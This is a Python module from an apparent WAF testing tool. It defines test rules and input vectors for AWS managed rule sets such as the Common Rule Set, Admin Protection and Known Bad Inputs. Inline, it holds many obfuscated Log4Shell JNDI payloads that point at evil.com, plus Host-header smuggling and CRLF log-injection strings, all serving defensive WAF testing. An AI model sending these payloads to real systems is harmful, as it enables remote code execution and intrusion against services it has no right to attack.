#!/usr/bin/env python3
"""
AWS WAF Rules

This module defines the rules specific to AWS WAF testing, particularly
focusing on the AWSManagedRulesCommonRuleSet.
"""

from typing import List, Dict
import sys
import os

# Add parent directory to path to allow imports from core module
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from core.engine import WafRule

# Import vectors
from vectors.common import (
    SQLInjectionVectors,
    XSSVectors,
    LFIVectors,
    RFIVectors,
    CommandInjectionVectors,
    RestrictedExtensionsVectors
)
from vectors.aws import (
    EC2MetadataVectors,
    LambdaExploitVectors
)

def get_category_mappings() -> Dict[str, str]:
    """
    Get category mappings for AWS WAF rules.
    
    Returns:
        Dictionary mapping category keywords to rule name patterns
    """
    return {
        "aws": "AWS",
        "common": "CommonRuleSet",
        "admin": "AdminProtection",
        "amazon": "AmazonIp",
        "core": "CoreRuleSet",
        "sql": "SQLi",
        "xss": "XSS",
        "size": "SizeRestriction",
        "ip": "IpReputation",
        "bot": "BotControl",
        "linux": "Linux",
        "windows": "Windows",
        "php": "PHP",
        "posix": "PosixOS"
    }

def get_categories() -> Dict[str, str]:
    """
    Get categories for AWS WAF testing.
    
    Returns:
        Dictionary mapping category names to descriptions
    """
    return {
        "aws": "AWS-specific rules and protections",
        "common": "AWS Common Rule Set rules",
        "admin": "Protection for admin pages and interfaces",
        "amazon": "Amazon IP reputation rules",
        "core": "Core rule set protections",
        "sql": "SQL injection protections",
        "xss": "Cross-site scripting protections",
        "size": "Size restriction rules",
        "ip": "IP reputation-based rules",
        "bot": "Bot control and management rules",
        "linux": "Linux-specific protections",
        "windows": "Windows-specific protections",
        "php": "PHP-specific protections",
        "posix": "POSIX OS specific protections"
    }

# Main function to get all rules - needed for the rule loading system
def get_rules() -> List[WafRule]:
    """
    Get all AWS WAF rules for testing.
    
    Returns:
        List of WafRule objects for testing AWS WAF
    """
    return create_aws_managed_rules_all()


def create_aws_managed_rules_common_rule_set() -> List[WafRule]:
    """
    Create test rules for the AWSManagedRulesCommonRuleSet.
    Based on the official AWS documentation.
    
    Returns:
        List of WafRule objects for testing the AWSManagedRulesCommonRuleSet
    """
    rules = []
    
    # NoUserAgent_HEADER - Blocks requests that don't have a user-agent header
    rules.append(
        WafRule(
            name="NoUserAgent_HEADER",
            description="Blocks requests that don't have a user-agent header",
            test_vectors=["", " ", "\t", "\n", "null", "undefined", "none", "-"],
            request_components=["header"]
        )
    )
    
    # UserAgent_BadBots_HEADER - Blocks requests with user-agents associated with bots or crawlers
    rules.append(
        WafRule(
            name="UserAgent_BadBots_HEADER",
            description="Blocks requests with user-agents associated with bots or crawlers",
            test_vectors=[
                "Googlebot", "bingbot", "Baiduspider", "YandexBot", "Sogou web spider",
                "sqlmap", "Nmap Scripting Engine", "nikto", "Acunetix", "Nessus", "Burp",
                # Obfuscated bot names
                "G o o g l e b o t", "G\u200Dooglebot", "nM\u0430p", "sqlm\u0430p"
            ],
            request_components=["header"]
        )
    )
    
    # SizeRestrictions_QUERYSTRING - Inspects query strings that are larger than a certain size
    rules.append(
        WafRule(
            name="SizeRestrictions_QUERYSTRING",
            description="Inspects query strings that are larger than a certain size",
            test_vectors=[
                "?" + "A" * 1024,  # 1KB
                "?" + "A" * 4096,  # 4KB
                "?" + "A" * 8192,  # 8KB
                "?" + "&".join([f"param{i}=value" for i in range(100)]),  # Many params
                "?" + "&".join([f"param{i}={'A' * 100}" for i in range(50)])  # Many params with long values
            ],
            request_components=["querystring"]
        )
    )
    
    # SizeRestrictions_Cookie_HEADER - Inspects cookies that are larger than a certain size
    rules.append(
        WafRule(
            name="SizeRestrictions_Cookie_HEADER",
            description="Inspects cookies that are larger than a certain size",
            test_vectors=[
                {"Cookie": "session=" + "A" * 4096},  # 4KB cookie
                {"Cookie": "session=" + "A" * 8192},  # 8KB cookie
                {"Cookie": "; ".join([f"cookie{i}={'A' * 500}" for i in range(20)])},  # Multiple medium cookies
                {"Cookie": f"largevalue={'A' * 2000}; anotherlarge={'B' * 2000}; third={'C' * 2000}"}  # Multiple large cookies
            ],
            request_components=["cookie"]
        )
    )
    
    # SizeRestrictions_BODY - Inspects request bodies that are larger than a certain size
    rules.append(
        WafRule(
            name="SizeRestrictions_BODY",
            description="Inspects request bodies that are larger than a certain size",
            test_vectors=[
                "A" * 10000,  # 10KB plain text
                "A" * 100000,  # 100KB plain text
                {"data": "A" * 10000},  # 10KB in JSON
                "&".join([f"field{i}={'A' * 1000}" for i in range(10)])  # Form data with multiple fields
            ],
            request_components=["body"]
        )
    )
    
    # SizeRestrictions_URIPATH - Inspects URI paths that are larger than a certain size
    rules.append(
        WafRule(
            name="SizeRestrictions_URIPATH",
            description="Inspects URI paths that are larger than a certain size",
            test_vectors=[
                "/" + "very/long/path/" * 100,
                "/" + "A" * 2000,
                "/" + "/".join(["A" * 20 for i in range(100)])
            ],
            request_components=["uri"]
        )
    )
    
    # EC2MetaDataSSRF_BODY - Blocks requests that might access the EC2 metadata service via request body
    rules.append(
        WafRule(
            name="EC2MetaDataSSRF_BODY",
            description="Blocks attempts to access the EC2 metadata service via request body",
            test_vectors=EC2MetadataVectors.all(),
            request_components=["body"]
        )
    )
    
    # EC2MetaDataSSRF_COOKIE - Blocks requests that might access the EC2 metadata service via cookies
    rules.append(
        WafRule(
            name="EC2MetaDataSSRF_COOKIE",
            description="Blocks attempts to access the EC2 metadata service via cookies",
            test_vectors=EC2MetadataVectors.all(),
            request_components=["cookie"]
        )
    )
    
    # EC2MetaDataSSRF_URIPATH - Blocks requests that might access the EC2 metadata service via URI path
    rules.append(
        WafRule(
            name="EC2MetaDataSSRF_URIPATH",
            description="Blocks attempts to access the EC2 metadata service via URI path",
            test_vectors=EC2MetadataVectors.all(),
            request_components=["uri"]
        )
    )
    
    # EC2MetaDataSSRF_QUERYARGUMENTS - Blocks requests that might access the EC2 metadata service via query string
    rules.append(
        WafRule(
            name="EC2MetaDataSSRF_QUERYARGUMENTS",
            description="Blocks attempts to access the EC2 metadata service via query string",
            test_vectors=EC2MetadataVectors.all(),
            request_components=["querystring"]
        )
    )
    
    # GenericLFI_QUERYARGUMENTS - Blocks requests with local file inclusion patterns in query arguments
    rules.append(
        WafRule(
            name="GenericLFI_QUERYARGUMENTS",
            description="Blocks requests with local file inclusion patterns in query arguments",
            test_vectors=LFIVectors.all(),
            request_components=["querystring"]
        )
    )
    
    # GenericLFI_URIPATH - Blocks requests with local file inclusion patterns in URI path
    rules.append(
        WafRule(
            name="GenericLFI_URIPATH",
            description="Blocks requests with local file inclusion patterns in URI path",
            test_vectors=LFIVectors.all(),
            request_components=["uri"]
        )
    )
    
    # GenericLFI_BODY - Blocks requests with local file inclusion patterns in request body
    rules.append(
        WafRule(
            name="GenericLFI_BODY",
            description="Blocks requests with local file inclusion patterns in request body",
            test_vectors=LFIVectors.all(),
            request_components=["body"]
        )
    )
    
    # RestrictedExtensions_URIPATH - Blocks requests for files with restricted extensions in URI path
    rules.append(
        WafRule(
            name="RestrictedExtensions_URIPATH",
            description="Blocks requests for files with restricted extensions in URI path",
            test_vectors=RestrictedExtensionsVectors.all(),
            request_components=["uri"]
        )
    )
    
    # RestrictedExtensions_QUERYARGUMENTS - Blocks requests for files with restricted extensions in query arguments
    rules.append(
        WafRule(
            name="RestrictedExtensions_QUERYARGUMENTS",
            description="Blocks requests for files with restricted extensions in query arguments",
            test_vectors=RestrictedExtensionsVectors.all(),
            request_components=["querystring"]
        )
    )
    
    # GenericRFI_QUERYARGUMENTS - Blocks requests with remote file inclusion patterns in query arguments
    rules.append(
        WafRule(
            name="GenericRFI_QUERYARGUMENTS",
            description="Blocks requests with remote file inclusion patterns in query arguments",
            test_vectors=RFIVectors.all(),
            request_components=["querystring"]
        )
    )
    
    # GenericRFI_BODY - Blocks requests with remote file inclusion patterns in request body
    rules.append(
        WafRule(
            name="GenericRFI_BODY",
            description="Blocks requests with remote file inclusion patterns in request body",
            test_vectors=RFIVectors.all(),
            request_components=["body"]
        )
    )
    
    # GenericRFI_URIPATH - Blocks requests with remote file inclusion patterns in URI path
    rules.append(
        WafRule(
            name="GenericRFI_URIPATH",
            description="Blocks requests with remote file inclusion patterns in URI path",
            test_vectors=RFIVectors.all(),
            request_components=["uri"]
        )
    )
    
    # CrossSiteScripting_COOKIE - Blocks requests with cross-site scripting patterns in cookies
    rules.append(
        WafRule(
            name="CrossSiteScripting_COOKIE",
            description="Blocks requests with cross-site scripting patterns in cookies",
            test_vectors=XSSVectors.all(),
            request_components=["cookie"]
        )
    )
    
    # CrossSiteScripting_QUERYARGUMENTS - Blocks requests with cross-site scripting patterns in query arguments
    rules.append(
        WafRule(
            name="CrossSiteScripting_QUERYARGUMENTS",
            description="Blocks requests with cross-site scripting patterns in query arguments",
            test_vectors=XSSVectors.all(),
            request_components=["querystring"]
        )
    )
    
    # CrossSiteScripting_BODY - Blocks requests with cross-site scripting patterns in request body
    rules.append(
        WafRule(
            name="CrossSiteScripting_BODY",
            description="Blocks requests with cross-site scripting patterns in request body",
            test_vectors=XSSVectors.all(),
            request_components=["body"]
        )
    )
    
    # CrossSiteScripting_URIPATH - Blocks requests with cross-site scripting patterns in URI path
    rules.append(
        WafRule(
            name="CrossSiteScripting_URIPATH",
            description="Blocks requests with cross-site scripting patterns in URI path",
            test_vectors=XSSVectors.all(),
            request_components=["uri"]
        )
    )
    
    return rules


def create_aws_managed_rules_admin_protection_rule_set() -> List[WafRule]:
    """
    Create test rules for the AWSManagedRulesAdminProtectionRuleSet.
    
    Returns:
        List of WafRule objects for testing the AWSManagedRulesAdminProtectionRuleSet
    """
    rules = []
    
    # AdminProtection_URIPATH - Blocks requests to admin pages
    admin_paths = [
        "/admin", "/administrator", "/administration", "/admin.php", "/admin.aspx", "/admin.html",
        "/wp-admin", "/wp-login.php", "/admin-panel", "/admin-console", "/admin/login",
        "/administrator/index.php", "/panel", "/cpanel", "/dashboard", "/manage", "/management",
        "/control", "/console", "/webadmin", "/admins", "/administrators", "/wp-admin/post.php",
        "/admin/config", "/admin/configuration", "/admin/settings", "/admin/setup", "/admin/install",
        "/admin/backup", "/admin/restore", "/admin/users", "/admin/user", "/admin/accounts",
        "/admin/roles", "/admin/permissions", "/admin/log", "/admin/logs", "/admin/analytics",
        "/phpmyadmin", "/mysqladmin", "/pgadmin", "/adminer", "/sql", "/mysql", "/database",
        "/.env", "/config", "/configuration", "/settings", "/setup", "/install", "/backup"
    ]
    
    rules.append(
        WafRule(
            name="AdminProtection_URIPATH",
            description="Blocks access to admin pages and interfaces",
            test_vectors=admin_paths,
            request_components=["uri"]
        )
    )
    
    return rules


def create_aws_managed_rules_known_bad_inputs_rule_set() -> List[WafRule]:
    """
    Create test rules for the AWSManagedRulesKnownBadInputsRuleSet.
    
    Returns:
        List of WafRule objects for testing the AWSManagedRulesKnownBadInputsRuleSet
    """
    rules = []
    
    # Host header injection
    host_header_vectors = [
        "evil.com",
        "localhost",
        "169.254.169.254",
        "127.0.0.1",
        "internal-service",
        "evil.com, internal-service",
        "evil.com:80",
        "evil.com:443",
        "evil.com, localhost",
        "evil.com, 127.0.0.1",
        "evil.com:80\r\nContent-Length: 0\r\n\r\nGET / HTTP/1.1\r\nHost: internal-service\r\n\r\n"
    ]
    
    rules.append(
        WafRule(
            name="HostHeaderInjection_HEADER",
            description="Blocks requests with malicious Host headers",
            test_vectors=host_header_vectors,
            request_components=["header"]
        )
    )
    
    # Log injection
    log_injection_vectors = [
        "\n",
        "\r\n",
        "%0A",
        "%0D%0A",
        "\r\nMalicious log entry",
        "\r\nX-Forwarded-For: 127.0.0.1",
        "\r\nX-Forwarded-For: evil.com",
        "\n\n<script>alert(1)</script>",
        "\r\n\r\n<script>alert(1)</script>",
        "%0A%0A<script>alert(1)</script>",
        "%0D%0A%0D%0A<script>alert(1)</script>"
    ]
    
    rules.append(
        WafRule(
            name="Log4JRCE_HEADER",
            description="Blocks Log4j/Log4Shell exploitation attempts in headers",
            test_vectors=[
                "${jndi:ldap://evil.com/exploit}",
                "${jndi:dns://evil.com}",
                "${jndi:rmi://evil.com}",
                "${jndi:ldap://127.0.0.1:1389/exploit}",
                "${jndi:ldap://${sys:java.version}.evil.com}",
                "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/exploit}",
                "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//evil.com/exploit}",
                "${${lower:j}ndi:${lower:l}dap://evil.com/exploit}",
                "${${upper:j}ndi:${upper:l}dap://evil.com/exploit}",
                "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://evil.com/exploit}",
                "${jndi:ldap://127.0.0.1#.evil.com/exploit}",
                "${${env:BARFOO:-j}${env:BARFOO:-n}${env:BARFOO:-d}${env:BARFOO:-i}:${env:BARFOO:-l}${env:BARFOO:-d}${env:BARFOO:-a}${env:BARFOO:-p}://evil.com/exploit}",
                "${${lower:jndi}:${lower:ldap}://evil.com/exploit}",
                "${${lower:${lower:jndi}}:${lower:ldap}://evil.com/exploit}",
                "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}",
                "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://evil.com/exploit}",
                "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//evil.com/exploit}"
            ],
            request_components=["header"]
        )
    )
    
    rules.append(
        WafRule(
            name="Log4JRCE_QUERYSTRING",
            description="Blocks Log4j/Log4Shell exploitation attempts in query string",
            test_vectors=[
                "${jndi:ldap://evil.com/exploit}",
                "${jndi:dns://evil.com}",
                "${jndi:rmi://evil.com}",
                "${jndi:ldap://127.0.0.1:1389/exploit}",
                "${jndi:ldap://${sys:java.version}.evil.com}",
                "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/exploit}",
                "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//evil.com/exploit}",
                "${${lower:j}ndi:${lower:l}dap://evil.com/exploit}",
                "${${upper:j}ndi:${upper:l}dap://evil.com/exploit}",
                "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://evil.com/exploit}",
                "${jndi:ldap://127.0.0.1#.evil.com/exploit}",
                "${${env:BARFOO:-j}${env:BARFOO:-n}${env:BARFOO:-d}${env:BARFOO:-i}:${env:BARFOO:-l}${env:BARFOO:-d}${env:BARFOO:-a}${env:BARFOO:-p}://evil.com/exploit}",
                "${${lower:jndi}:${lower:ldap}://evil.com/exploit}",
                "${${lower:${lower:jndi}}:${lower:ldap}://evil.com/exploit}",
                "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}",
                "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://evil.com/exploit}",
                "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//evil.com/exploit}"
            ],
            request_components=["querystring"]
        )
    )
    
    rules.append(
        WafRule(
            name="Log4JRCE_BODY",
            description="Blocks Log4j/Log4Shell exploitation attempts in request body",
            test_vectors=[
                "${jndi:ldap://evil.com/exploit}",
                "${jndi:dns://evil.com}",
                "${jndi:rmi://evil.com}",
                "${jndi:ldap://127.0.0.1:1389/exploit}",
                "${jndi:ldap://${sys:java.version}.evil.com}",
                "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/exploit}",
                "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//evil.com/exploit}",
                "${${lower:j}ndi:${lower:l}dap://evil.com/exploit}",
                "${${upper:j}ndi:${upper:l}dap://evil.com/exploit}",
                "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://evil.com/exploit}",
                "${jndi:ldap://127.0.0.1#.evil.com/exploit}",
                "${${env:BARFOO:-j}${env:BARFOO:-n}${env:BARFOO:-d}${env:BARFOO:-i}:${env:BARFOO:-l}${env:BARFOO:-d}${env:BARFOO:-a}${env:BARFOO:-p}://evil.com/exploit}",
                "${${lower:jndi}:${lower:ldap}://evil.com/exploit}",
                "${${lower:${lower:jndi}}:${lower:ldap}://evil.com/exploit}",
                "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}",
                "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://evil.com/exploit}",
                "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//evil.com/exploit}"
            ],
            request_components=["body"]
        )
    )
    
    # SQL injection
    rules.append(
        WafRule(
            name="SQLi_QUERYARGUMENTS",
            description="Blocks SQL injection attempts in query arguments",
            test_vectors=SQLInjectionVectors.all(),
            request_components=["querystring"]
        )
    )
    
    rules.append(
        WafRule(
            name="SQLi_BODY",
            description="Blocks SQL injection attempts in request body",
            test_vectors=SQLInjectionVectors.all(),
            request_components=["body"]
        )
    )
    
    rules.append(
        WafRule(
            name="SQLi_COOKIE",
            description="Blocks SQL injection attempts in cookies",
            test_vectors=SQLInjectionVectors.all(),
            request_components=["cookie"]
        )
    )
    
    return rules


def create_aws_managed_rules_anonymized_ip_list() -> List[WafRule]:
    """
    Create test rules for the AWSManagedRulesAnonymizedIPList.
    This is more conceptual since we can't test actual IP blocks directly.
    
    Returns:
        List of WafRule objects for testing anonymized IP concepts
    """
    rules = []
    
    # Test X-Forwarded-For headers with known anonymizing services
    x_forwarded_for_vectors = [
        # TOR exit nodes (conceptual)
        "X-Forwarded-For: 95.216.145.1",  # Example TOR exit node
        "X-Forwarded-For: 185.220.101.1",  # Example TOR exit node
        
        # VPN services (conceptual)
        "X-Forwarded-For: 185.159.157.1",  # Example VPN IP
        "X-Forwarded-For: 104.194.8.1",    # Example VPN IP
        
        # Proxy services (conceptual)
        "X-Forwarded-For: 34.231.200.1",   # Example proxy IP
        "X-Forwarded-For: 52.87.255.1",    # Example proxy IP
        
        # Multiple IPs in header
        "X-Forwarded-For: 95.216.145.1, 192.168.1.1",
        "X-Forwarded-For: 185.220.101.1, 10.0.0.1, 172.16.0.1"
    ]
    
    rules.append(
        WafRule(
            name="AnonymizedIPList_HEADER",
            description="Blocks requests from anonymizing services (TOR, VPN, proxies)",
            test_vectors=x_forwarded_for_vectors,
            request_components=["header"]
        )
    )
    
    return rules


def create_aws_managed_rules_all() -> List[WafRule]:
    """
    Create test rules for all AWS managed rule sets.
    
    Returns:
        List of WafRule objects for testing all AWS managed rule sets
    """
    rules = []
    
    # Combine all rule sets
    rules.extend(create_aws_managed_rules_common_rule_set())
    rules.extend(create_aws_managed_rules_admin_protection_rule_set())
    rules.extend(create_aws_managed_rules_known_bad_inputs_rule_set())
    rules.extend(create_aws_managed_rules_anonymized_ip_list())
    
    return rules


if __name__ == "__main__":
    print("AWS WAF Rules module loaded.")
    print(f"Common Rule Set: {len(create_aws_managed_rules_common_rule_set())} rules")
    print(f"Admin Protection Rule Set: {len(create_aws_managed_rules_admin_protection_rule_set())} rules")
    print(f"Known Bad Inputs Rule Set: {len(create_aws_managed_rules_known_bad_inputs_rule_set())} rules")
    print(f"Anonymized IP List: {len(create_aws_managed_rules_anonymized_ip_list())} rules")
    print(f"All Rules: {len(create_aws_managed_rules_all())} rules")